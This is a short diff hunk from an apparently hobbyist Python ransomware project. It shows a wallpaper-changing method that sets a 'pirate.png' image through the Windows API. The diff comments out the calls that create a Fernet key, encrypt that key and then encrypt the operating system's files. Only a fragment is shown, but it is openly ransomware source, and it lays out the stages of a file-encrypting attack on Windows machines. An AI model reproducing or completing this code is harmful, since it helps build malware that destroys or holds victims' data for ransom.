@@ -73,12 +73,12 @@ class Ransomware:
     
     def update_background(self):
         ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\\Users\\jerry\\Documents\\pyransomware\\pirate.png', 0)
+        
 
 
-
-
-malware = Ransomware()
-malware.create_fernet_key()
-malware.encrypt_fernet_key()
-malware.encrypt_os()
+# Without GUI:
+# malware = Ransomware()
+# malware.create_fernet_key()
+# malware.encrypt_fernet_key()
+# malware.encrypt_os()
 # malware.update_background()
